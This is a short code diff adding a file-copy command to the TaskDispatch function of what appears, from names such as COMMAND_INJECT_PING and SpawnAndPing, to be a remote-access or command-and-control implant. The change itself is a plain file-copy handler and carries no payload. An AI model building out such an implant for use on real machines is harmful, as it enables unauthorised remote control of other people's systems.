@@ -57,6 +57,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_FILE_MOVE:
 			FilesystemMove(buffer, size);
 			break;
+		case COMMAND_FILE_COPY:
+			FilesystemCopy(buffer, size);
+			break;
 		
 		case COMMAND_INJECT_PING:
 			SpawnAndPing(buffer, size, TRUE);
